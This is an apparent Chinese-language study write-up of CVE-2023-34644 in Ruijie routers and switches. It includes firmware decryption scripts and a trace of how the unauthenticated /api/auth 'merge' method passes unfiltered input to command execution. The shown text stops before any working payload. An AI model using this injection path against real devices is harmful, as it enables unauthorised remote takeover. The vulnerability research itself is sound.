<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># CVE-2023-34644 代码注入,CVE-2023-34644 代码注入</title>
    <link rel="stylesheet" href="/assets/css/notes.min.css">
</head>
<body>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>CVE-2023-34644 代码注入</h1>
<h2>1.漏洞描述</h2>
<p>睿捷网络家庭路由器和中继器 RG-EW 系列 EW_3.0(1)B11P204，RG-NBS 和 RG-S1930 系列交换机 SWITCH_3.0(1)B11P218，商业 VPN 路由器 RG-EG 系列 EG_3.0(1)B11P216，无线接入点 EAP 和 RAP 系列 AP_3.0(1)B11P218，以及无线控制器 NBC 系列 AC_3.0(1)B11P86 中的漏洞，允许未经授权的远程攻击者通过向/cgi-bin/luci/api/auth 发送特制的 POST 请求来获取最高权限。</p>
<h2>2.mips 分析环境搭建</h2>
<p>要求工具：</p>
<p>RetDec IDA plugin：<a href="https://github.com/avast/retdec-idaplugin">https://github.com/avast/retdec-idaplugin</a></p>
<p>Retdec：<a href="https://github.com/avast/retdec">https://github.com/avast/retdec</a></p>
<p>cmake</p>
<p>ida8.3，ida9.0(可以直接反汇编 mips，不用安装 retdec 插件)</p>
<p>照着很多教程搭了很多遍还是没有弄好，遂放弃，后来发现我的 ida9.0 可以直接反汇编 mips，太好了。（jeb 也可以反汇编 mips 的，但是他那个界面我用着不太习惯）</p>
<p>另外就是使用 buildroot 安装交叉编译环境</p>
<h2>3.固件解密</h2>
<p>由于没有找到 EW_3.0(1)B11P219_EW1200I_10200109_install_encypto.bin 老固件，所以我们用新版本 EW_3.0(1)B11P261_EW1300G_11222807_install_encypto.bin 的固件尝试一下</p>
<p>老版本的固件作者已经提供了解密后的，新版本的解密思路和老版本差不过</p>
<p>直接使用 binwalk 是识别不出来的：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250120161644681.png" alt="image-20250120161644681"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250120161746057.png" alt="image-20250120161746057"></p>
<p>根据 winmt 师傅的说法，文件末尾会填充大量的 <code>\xff</code> 或者 <code>\x00</code> 字节码，这里有大量的重复字节码 <code>0x80</code> ，猜测可能是单字节异或 <code>key</code> 得到的。尝试拿 <code>0xff</code> 与 <code>0x80</code> 进行异或，得到疑似 <code>key</code> 值 <code>0x7f</code></p>
<p>python 编写一个简单的解密脚本：</p>
<pre><code class="language-python">def xor_firmware(input_file, output_file):
    try:
        with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
            while byte := f_in.read(1):
                f_out.write(bytes([byte[0] ^ 0x7f]))
        print(f&quot;处理完成，结果已保存到 {output_file}&quot;)
    except IOError as e:
        print(f&quot;文件操作失败: {e}&quot;)

if __name__ == &quot;__main__&quot;:
    input_file = &quot;EW_3.0(1)B11P261_EW1300G_11222807_install_encypto.bin&quot; 
    output_file = &quot;output_firmware.bin&quot; 
    xor_firmware(input_file, output_file)
</code></pre>
<p>binwalk 再次识别可以识别出来</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250120162931177.png" alt="image-20250120162931177"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250120163029544.png" alt="image-20250120163029544"></p>
<p>识别出来的文件系统：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250120163219155.png" alt="image-20250120163219155"></p>
<p>拿到文件系统后，可以去寻找负责加解密的程序</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250120163501358.png" alt="image-20250120163501358"></p>
<p>对 rg-upgrade-crypto 二进制文件进行分析:</p>
<p>在 main 函数里面，主要是对运行文件时输入的参数进行一个处理，真正处理的函数在 sub_4010c0 里面</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250120172853721.png" alt="image-20250120172853721"></p>
<p>分析发现，加解密用的是一套流程：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250120174504784.png" alt="image-20250120174504784"></p>
<p>主要加密函数调用的是 sub_400B04()</p>
<p>因为 IDA 里面定义了很多的宏，所以如果对这些自定义的宏不太了解的化看起来还是挺吃力的，Ghidra 对 Mips 指令的支持更好，而且不用安装相关插件就可以反汇编，而 ida 要高版本才行，安装 retdec 插件我暂时也还没安装成功</p>
<p>左边是 IDA 的反汇编，右边是 Ghidra 的反汇编，这样我们就可以分析出宏 BYTEn(x)的含义为从 x 的位置取第 n 个字节</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250121090656006.png" alt="image-20250121090656006"></p>
<p>对照着反汇编，参考 winmt 师傅写的解密脚本：</p>
<p>主要流程：分别打开和创建加解密文件，分配加解密的缓冲区，首先读取并丢弃掉前 22 字节头部，对剩余内容进行逐轮次解密，解密的过程前几轮密钥是在出事后，然后密钥就会一直保持不变直到下一轮迭代的解密</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;malloc.h&gt;
#include &lt;sys/stat.h&gt;

typedef unsigned char uint8_t;
#define BYTE(x, n) (*((uint8_t *)&amp;(x)+n))

void error_msg(char *msg)
{
	puts(msg);
	exit(-1);
}

int num1 = 1, num2 = 0x10001;

void decrypt(uint8_t *enc_buf, uint8_t *dec_buf, int length)
{
	for (int i = 0; i &lt; length; i++)
	{
		int sum = (uint8_t)num1 + (uint8_t)num2 + BYTE(num2, 1) + BYTE(num2, 2);
		BYTE(num2, sizeof(num2)/sizeof(uint8_t)-1) = sum % 2;
	
		for (int j = 0; j &lt; 6; j++)
			*((uint8_t *)&amp;num1 + j) = *((uint8_t *)&amp;num1 + j + 1);
	
		uint8_t key = 0;
		for (int k = 0; k &lt; 8; k++)
			key |= *((uint8_t *)&amp;num1 + k) &lt;&lt; k;
		*(uint8_t *)(dec_buf + i) = *(uint8_t *)(enc_buf + i) ^ key;
	}
}

int main(int argc, char **argv, const char **envp)
{
	if (argc &lt; 2) error_msg(&quot;Usage: ./rg-decrypt [encrypted_firmware_path]&quot;);

	char *enc_path = strdup(argv[1]);
	char *dec_path = malloc(strlen(argv[1]) + 0x10);
	strcpy(dec_path, argv[1]);
	strcat(dec_path, &quot;.decrypted&quot;);

	struct stat stat_buf;
	int stat_fd = stat(enc_path, &amp;stat_buf);
	if (stat_fd &lt; 0) error_msg(&quot;The encrypted firmware does not exist !&quot;);
	int size = stat_buf.st_size;

	uint8_t *enc_buf = (uint8_t *)malloc(0x1000);
	uint8_t *dec_buf = (uint8_t *)malloc(0x1000);

	int enc_fd = open(enc_path, O_RDONLY);
	if (enc_fd &lt; 0) error_msg(&quot;Error to open the encrypted firmware !&quot;);

	int dec_fd = open(dec_path, O_WRONLY | O_CREAT, S_IREAD | S_IWRITE | S_IRGRP);
	if (dec_fd &lt; 0) error_msg(&quot;Error to create the decrypted firmware !&quot;);

	if (read(enc_fd, enc_buf, 22) != 22) error_msg(&quot;Error to read from the encrypted firmware !&quot;);
	size -= 22;

	while(size &gt; 0)
	{
		int len = size;
		if (size &gt; 0x1000) len = 0x1000;
	
		memset(enc_buf, 0, sizeof(enc_buf));
		memset(dec_buf, 0, sizeof(dec_buf));
	
		if (read(enc_fd, enc_buf, len) != len) error_msg(&quot;Error to read from the encrypted firmware !&quot;);
		decrypt(enc_buf, dec_buf, len);
		if (write(dec_fd, dec_buf, len) != len) error_msg(&quot;Error to write into the decrypted firmware !&quot;);
		size -= len;
	}

	free(enc_buf);
	free(dec_buf);
	close(enc_fd);
	close(dec_fd);
	return 0;
}

</code></pre>
<p>编译：</p>
<pre><code class="language-shell">gcc rg-decryt.c  -o rg-decryt -m32 -static -g
</code></pre>
<p>运行：</p>
<pre><code class="language-shell">./rg-decryt 'EW_3.0(1)B11P261_EW1300G_11222807_install_encypto.bin' 
</code></pre>
<p>在每一轮的加密过程中，只有每一轮前几次加密的密钥不是 127，后面的密钥都是 127</p>
<p>可以对比一下前后不同解密算法，用 binwalk 分析后的结果：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250121185028335.png" alt="image-20250121185028335"></p>
<h2>4.解密后的固件</h2>
<p>使用 binwalk 分析一下：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250118174114859.png" alt="image-20250118174114859"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250118174213498.png" alt="image-20250118174213498"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250118174310899.png" alt="image-20250118174310899"></p>
<p>识别出来的文件系统：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250118174705138.png" alt="image-20250118174705138"></p>
<h2>5.luci 工作原理</h2>
<p>LuCI 作为“FFLuCI”诞生于 2008 年 3 月份，目的是为 OpenWrt 固件从 Whiterussian 到 Kamikaze 实现快速配置接口。Lua 是一个小巧的脚本语言，很容易嵌入其它语言。轻量级 LUA 语言的官方版本只包括一个精简的核心和最基本的库。这使得 LUA 体积小、启动速度快，从而适合嵌入在别的程序里。UCI 是 OpenWrt 中为实现所有系统配置的一个统一接口，英文名 Unified Configuration Interface，即统一配置接口。LuCI, 即是这两个项目的合体，可以实现路由的网页配置界面。</p>
<p>最初开发这个项目的原因是没有一个应用于嵌入式的免费，干净，可扩展以及维护简单的网页用户界面接口。大部分相似的配置接口太依赖于大量的 Shell 脚本语言的应用，但是 LuCi 使用的是 Lua 编程语言，并将接口分为逻辑部分，如模板和视图。LuCI 使用的是面向对象的库和模板，确保了高效的执行，轻量的安装体积，更快的执行速度以及最重要的一个特性————更好的可维护性。</p>
<p>Lua 工作和配置文件在/usr/lib/lua 目录下</p>
<p>Luci 工作和配置文件在/usr/lib/lua/luci 目录下</p>
<p>luci 目录常用到的是：controller、view、以及 Model 目录，它们构成一个 MVC 管理机制</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250122110035125.png" alt="image-20250122110035125"></p>
<p>在 <code>www/index.html</code> 下会指定 cgi 程序的启动脚本</p>
<pre><code>&lt;a href=&quot;/cgi-bin/luci/&quot;&gt;
</code></pre>
<p>而在 luci 中，会指定加载的模块，调度器索引缓存路径，启动的 run 函数</p>
<pre><code>#!/usr/bin/lua
require &quot;luci.cacheloader&quot;
require &quot;luci.sgi.cgi&quot;
luci.dispatcher.indexcache = &quot;/tmp/luci-indexcache&quot;
luci.sgi.cgi.run()
</code></pre>
<p>在 <code>usr/lib/lua/luci/sgi/cgi.lua</code> 中，创建一个 HTTP 请求对象，创建一个协程来处理 HTTP 请求，并且循环处理协程的状态，直到协程结束</p>
<pre><code class="language-lua">function run()
	local r = luci.http.Request(
		luci.sys.getenv(),
		limitsource(io.stdin, tonumber(luci.sys.getenv(&quot;CONTENT_LENGTH&quot;))),
		ltn12.sink.file(io.stderr)
	)

	local x = coroutine.create(luci.dispatcher.httpdispatch)
	local hcache = &quot;&quot;
	local active = true

	while coroutine.status(x) ~= &quot;dead&quot; do
		local res, id, data1, data2 = coroutine.resume(x, r)

		if not res then
			print(&quot;Status: 500 Internal Server Error&quot;)
			print(&quot;Content-Type: text/plain\n&quot;)
			print(id)
			break;
		end

		if active then
			if id == 1 then
				io.write(&quot;Status: &quot; .. tostring(data1) .. &quot; &quot; .. data2 .. &quot;\r\n&quot;)
			elseif id == 2 then
				hcache = hcache .. data1 .. &quot;: &quot; .. data2 .. &quot;\r\n&quot;
			elseif id == 3 then
				io.write(hcache)
				io.write(&quot;\r\n&quot;)
			elseif id == 4 then
				io.write(tostring(data1 or &quot;&quot;))
			elseif id == 5 then
				io.flush()
				io.close()
				active = false
			elseif id == 6 then
				data1:copyz(nixio.stdout, data2)
				data1:close()
			end
		end
	end
end
</code></pre>
<p>上述 run()函数中，创建了一个协同程序，调用 httpdispatch()函数，而这个函数位于 dispatcher.lua 中。通过分析可以发现，luci 真正的主体部分都在 dispatcher.lua 脚本里</p>
<p>dispatcher.lua 是 LuCI 框架中的调度器模块，负责处理 HTTP 请求并将其分派到相应的控制器:</p>
<ul>
<li>主要函数：
<ul>
<li><code>entry</code>：创建一个新的调度节点</li>
<li><code>httpdispatch</code>：处理 HTTP 请求。它解析请求路径，并将请求分派到相应的处理函数</li>
<li><code>dispatch</code>：用于将请求分派到相应的处理函数。它解析请求路径，并根据路径找到相应的节点，然后调用节点的目标函数</li>
</ul>
</li>
<li>辅助函数：
<ul>
<li><code>build_url</code>：构建相对 URL。</li>
<li><code>node_visible</code>：检查节点是否可见。</li>
<li><code>node_childs</code>：返回节点的子节点。</li>
<li><code>error404</code> 和 <code>error500</code>：发送 404 和 500 错误响应。</li>
<li><code>createindex</code> 和 <code>createtree</code>：创建调度树和索引。</li>
</ul>
</li>
</ul>
<p>lua 与 C/C++交互，主要靠 lua API 和向 lua 注册好的函数：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213214034257.png" alt="image-20250213214034257"></p>
<h2>6.漏洞分析</h2>
<h3>6.1 lua 链分析</h3>
<p>前半部分的调用链条如下：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/lua_line.drawio.png" alt="lua_line.drawio"></p>
<p>固件的 cgi 部分是用 lua 语言写的，挖掘未授权漏洞，那么我们就需要找到与鉴权相关的 API 接口</p>
<p>在 <code>/usr/lib/</code> 路径下存在一个 <code>lua</code> 目录，其中存放了很多 <code>lua</code> 文件，主要是对前端传入的数据进行处理传递给 cgi</p>
<p>搜索 sysauth，可以找到在 api.lua 文件中 sysauth = false</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250122102823959.png" alt="image-20250122102823959"></p>
<p>在 <code>/usr/lib/lua/luci/controller/eweb/api.lua</code> 文件中，配置了</p>
<pre><code class="language-lua"> entry({&quot;api&quot;, &quot;auth&quot;}, call(&quot;rpc_auth&quot;), nil).sysauth = false
</code></pre>
<p>而 entry 函数用于创建一个新的调度节点，定义在 <code>usr/lib/lua/luci/dispatcher.lua</code></p>
<pre><code class="language-lua">--- Create a new dispatching node and define common parameters.
-- @param	path	Virtual path
-- @param	target	Target function to call when dispatched.
-- @param	title	Destination node title
-- @param	order	Destination node order value (optional)
-- @return			Dispatching tree node
function entry(path, target, title, order)
	local c = node(unpack(path))

	c.target = target
	c.title = title
	c.order = order
	c.module = getfenv(2)._NAME

	return c
end
</code></pre>
<p>也就意味着当用户访问 <code>/api/auth</code> 路径的时候，将会调用 <code>rpc_auth</code> 函数 ，并且这里的 <code>sysauth</code> 是 false，表示无需系统认证就可以访问</p>
<p>跟踪 <code>rpc_auth</code> 函数：</p>
<p>首先引入了一些模块，然后判断 HTTP_CONTENT_LENGTH 的长度是否大于 1000 字节，如果不大于的化就会返回 json 格式，并进行 handle 处理</p>
<pre><code class="language-lua">-- 认证模块
function rpc_auth()
    local jsonrpc = require &quot;luci.utils.jsonrpc&quot;
    local http = require &quot;luci.http&quot;
    local ltn12 = require &quot;luci.ltn12&quot;
    local _tbl = require &quot;luci.modules.noauth&quot;
    if tonumber(http.getenv(&quot;HTTP_CONTENT_LENGTH&quot;) or 0) &gt; 1000 then
        http.prepare_content(&quot;text/plain&quot;)
        -- http.write({code = &quot;1&quot;, err = &quot;too long data&quot;})
        return &quot;too long data&quot;
    end
    http.prepare_content(&quot;application/json&quot;)
    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.write)
end
</code></pre>
<p><code>jsonrpc</code> 的 <code>handle</code> 函数：</p>
<p>这里主要关注一下 <code>resolve(tbl, json.method)</code></p>
<pre><code class="language-lua">function handle(tbl, rawsource, ...)
    local decoder = luci.json.Decoder()
    local stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())
    local json = decoder:get()
    local response
    local success = false

    if stat then
        if type(json.method) == &quot;string&quot; then
            local method = resolve(tbl, json.method)
            if method then
                response = reply(json.jsonrpc, json.id, proxy(method, json.params or {}))
            else
                response = reply(json.jsonrpc, json.id, nil, {code = -32601, message = &quot;Method not found.&quot;})
            end
        else
            response = reply(json.jsonrpc, json.id, nil, {code = -32600, message = &quot;Invalid request.&quot;})
        end
    else
        response = reply(&quot;2.0&quot;, nil, nil, {code = -32700, message = &quot;Parse error.&quot;, err = err})
    end

    return luci.json.Encoder(response, ...):source()
end
</code></pre>
<p>回溯重新定位一下 <code>tbl</code> , <code>local _tbl = require &quot;luci.modules.noauth&quot;</code> 相当于一个 table，里面定义了四个函数：login、singlelogin、merge、checkNet</p>
<pre><code class="language-lua">-- 登录
function login(params)
...
-- 单点登录
function singleLogin()
...
-- 网络合并
function merge(params)
...
-- ping checknet
function checkNet(params)
</code></pre>
<p>singleLogin 函数没有可以控制的参数，所以不考虑；checkNet 函数中参数可控的字段只有 params.host，并拼接入了命令字符串执行，但是在之前有 tool.checkIp(params.host)对其的合法性进行了检查，无法绕过；login 登录验证函数，这里可控的字段乍一看比较多，比如 params.password，params.encry，params.limit 等字段，但是追入分析真正可控的只有 password 字段，password 字段用 includeXxs 函数（同样在 tool.lua 中）过滤了危险字符（[`&amp;$;|]），但是并没有过滤\n 这个命令分隔符，后面又调用了 checkPasswd，里面又调用了 cmd.devSta.get 函数进一步处理，接着又会调用 doParams 函数对传入的 json 参数进行解析，在 doParams 的 encode 时候会对\n 类字符进行转义，所以这里我们也无法利用</p>
<p>所以，现在关注 merge 方法，merge 方法调用了 cmd.devSta.set，但是由于之前没有任何过滤，无需使用换行符作为命令分隔符，最简单的分号、反引号之类的即可，故 doParams 函数中的 encode 不会造成影响</p>
<pre><code class="language-lua">function merge(params)
    local cmd = require &quot;luci.modules.cmd&quot;
    return cmd.devSta.set({device = &quot;pc&quot;, module = &quot;networkId_merge&quot;, data = params, async = true})
end
</code></pre>
<pre><code class="language-lua">devSta[opt[i]] = function(params)
    local model = require &quot;dev_sta&quot;
    params.method = opt[i]
    params.cfg_cmd = &quot;dev_sta&quot;
    local data, back, ip, password, shell = doParams(params)
    return fetch(model.fetch, shell, params, opt[i], params.module, data, back, ip, password)
</code></pre>
<p>下面，data 字段又传入了 dev_sta.lua 的 fetch 函数，在这里面，对一些字段赋予了真假值后，最终将参数都传递给了/usr/lib/lua/libuflua.so 中的 client_call 函数，接下来，就是对二进制文件进行分析</p>
<pre><code class="language-lua">function fetch(cmd, module, param, back, ip, password, force, not_change_configId, multi)
    local uf_call = require &quot;libuflua&quot;
    local ctype

    ctype = get_ctype()
    param = param or &quot;&quot;
    ip = ip or &quot;&quot;
    password = password or &quot;&quot;
    if force and force == &quot;1&quot; then
    	force = true
    else
    	force = false
    end

    if back and back == &quot;1&quot; then
    	back = true
    else
    	back = false
    end   

    if not_change_configId then
    	not_change_configId = true
    else
    	not_change_configId = false
    end

    if multi then
    	multi = true
    else
    	multi = false
    end

    local stat = uf_call.client_call(ctype, cmd, module, param, back, ip, password, force, not_change_configId, multi)
    return stat
end
</code></pre>
<p>根据二进制的调用链条进行分析，发现其实调用的是 uf_client_call 函数，这是在其他共享库中定义的函数</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213224114914.png" alt="image-20250213224114914"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213224208604.png" alt="image-20250213224208604"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213224346085.png" alt="image-20250213224346085"></p>
<p>搜索并对比上面的库文件可以确定是 <a href="http://libunifyframe.so">libunifyframe.so</a></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213224451764.png" alt="image-20250213224451764"></p>
<p>其函数首先判断了 method 的类型，然后解析出报文中各字段的值，后面将其键值对添加到一个 JSON 对象中，接着将最终处理好的 JSON 对象转换为 JSON 格式的字符串，通过 uf_socket_msg_write 用 socket 套接字进行数据传输</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213224638859.png" alt="image-20250213224638859"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213224803605.png" alt="image-20250213224803605"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213224828464.png" alt="image-20250213224828464"></p>
<p>因为有 write 进行数据发送，那么肯定也存在一个地方 read 进行数据接收，查找一下可以定位到相关的文件，这里采取的是本地通信的方式</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213224942611.png" alt="image-20250213224942611"></p>
<p>同时我们也可以验证，在初始化脚本/etc/init.d/unifyframe-sgi 中，启动了 unifyframe-sgi.elf，即说明 unifyframe-sgi.elf 一直挂在进程中。因此，我们可以确定 unifyframe-sgi.elf 就是接收 <a href="http://libunifyframe.so">libunifyframe.so</a> 所发数据的文件（这里采用了 Ubus 总线进行进程间通信）</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213225136644.png" alt="image-20250213225136644"></p>
<h3>6.2 unifyframe-sgi.elf 分析</h3>
<p>下图是 zikh26 师傅梳理的 /usr/sbin/unifyframe-sgi.elf 文件中调用链和几个线程和信号量的关系</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213222158874.png" alt="image-20250213222158874"></p>
<p>可以看见 main 函数里面调用了 uf_socket_msg_read</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250213230148896.png" alt="image-20250213230148896"></p>
<p>对 main 函数进行详细的分析，最前面是创建临时目录和文件的基本操作，分配资源和初始化系统状态</p>
<pre><code class="language-c">  mkdir(&quot;/tmp/uniframe_sgi&quot;, 511, envp);
  v49 = v43;
  memset(v43, 0, 64);
  strcpy(v43, &quot;/tmp/sgi&quot;);
  strcat(v43, &quot;.sgi_ufm&quot;);
  v5 = open(v43, 770, 438);
  dword_435660 = v5;
  if ( v5 &lt; 0 )
  {
    v6 = *(_DWORD *)_errno_location();
    v7 = strerror(v6);
    v8 = v6;
    v9 = &quot;Failed to open file %s, errno=%d, %s.&quot;;
LABEL_8:
    printf(v9, &quot;.sgi_ufm&quot;, v8, v7);
    return 0;
  }
  v44[0] = 1;
  v45 = 0;
  v44[1] = 0;
  v46 = 0;
  v53 = v44;
  if ( fcntl(v5, 6, v44) &lt; 0 )
  {
    v10 = (int *)_errno_location();
    if ( *v10 == 13 || *v10 == 11 )
      close(dword_435660);
    v11 = *v10;
    v7 = strerror(v11);
    v8 = v11;
    v9 = &quot;Failed to lock file %s, errno=%d, %s.&quot;;
    goto LABEL_8;
  }
  reserve_record();
  reserve_core();
</code></pre>
<p>下面是一个 while 循环，这里我们需要了解 getopt 这个函数（由 Unix 标准库提供，包含在 &lt;unistd.h&gt; 头文件中）</p>
<p>函数原型为：</p>
<pre><code class="language-c">#include &lt;unistd.h&gt;
int getopt(int argc, char * const argv[], const char *optstring)；
</code></pre>
<ul>
<li>argc 是参数个数，和 main 函数的 argc 一样；</li>
<li>argv 是字符串指针，和 main 函数的 argv 一样；</li>
<li>optstring 是选项字符串
<ul>
<li>字符代表一个选项</li>
<li>没有冒号就表示纯选项，不需要参数</li>
<li>一个冒号代表该选项之后必须带有参数，可以使用空格，也可以不使用</li>
<li>两个冒号代表该项之后的参数可写可不写</li>
</ul>
</li>
</ul>
<p>比如：</p>
<pre><code>&quot;vha:b:c::&quot;就表示：

支持-v选项，通常用于打印版本号
支持-h选项，通常用于打印帮助信息
支持-a选项，后面必须带有一个参数
支持-b选项，后面必须带有一个参数
支持-c选项，后面可以带参数，也可以不用带参数
</code></pre>
<p>那么这里就是运行/usr/sbin/unifyframe-sgi.elf 需要其中的一个参数了</p>
<pre><code class="language-c">  while ( 1 )
  {
    v13 = getopt(argc, argv, &quot;dh&quot;);
    if ( v13 == -1 )
      break;
    if ( v13 == 'd' )
    {
      uf_log_printf(uf_log, &quot;ERROR (%s %s %d)open debug mode!&quot;, &quot;sgi.c&quot;, &quot;main&quot;, 1566);
      g_debug = 1;
    }
    else if ( v13 == 'h' )
    {
      puts(&quot;unifyframe-sgi.elf:&quot;);
      puts(&quot;-h : show help message &quot;);
      puts(&quot;-d: open debug mode&quot;);
      goto LABEL_98;
    }
  }
</code></pre>
<p>再后是一大堆 “排比句”，提取 lua 传递过来的参数，这里面就包括我们的 uf_socket_msg_read，再后面解析字段、执行具体操作的两个函数分别为 parse_content、add_pkg_cmd2_task</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214125607972.png" alt="image-20250214125607972"></p>
<p>而在 parse_content 中进行数据解析的具体位置应该是 parse_obj2_cmd，parse_obj2_cmd 函数结束后，会执行 pkg_add_cmd</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214125841973.png" alt="image-20250214125841973"></p>
<p>再回到我们继续执行的 add_pkg_cmd2_task 函数，前面部分是一些检查和无关的操作，后面发现调用了一个名字很敏感的函数 uf_cmd_call，用于命令执行相关的</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214130302473.png" alt="image-20250214130302473"></p>
<p>跟踪参数的传递处理，又发现一个重要的函数 ufm_handle</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214130850761.png" alt="image-20250214130850761"></p>
<p>在这里面，通过比较，触发关键函数 sub_40FD5C</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214131609711.png" alt="image-20250214131609711"></p>
<p>通过 sub_40FD5C（v2 是 data 字段的值，v3 是 2（devSta 所导致的））的比较，又触发了另一个关键函数 sub_40CEAC</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214131836282.png" alt="image-20250214131836282"></p>
<p>在这里面，v63 是上面拼接后的最终命令</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214132036286.png" alt="image-20250214132036286"></p>
<p>ufm_commit_add 函数又调用了 async_cmd_push_queue 函数</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214132148870.png" alt="image-20250214132148870"></p>
<p>async_cmd_push_queue 函数中会跳转到 label_32, 这里有一个信号量的操作，信号量加上了 1，意味着其他地方应该是有 sem_wait 阻塞了一个线程的执行</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214132247339.png" alt="image-20250214132247339"></p>
<p>对其交叉引用，定位到了 sub_41AFC8 函数</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214132413931.png" alt="image-20250214132413931"></p>
<p>这里面又调用了 sub_41ADF0 函数</p>
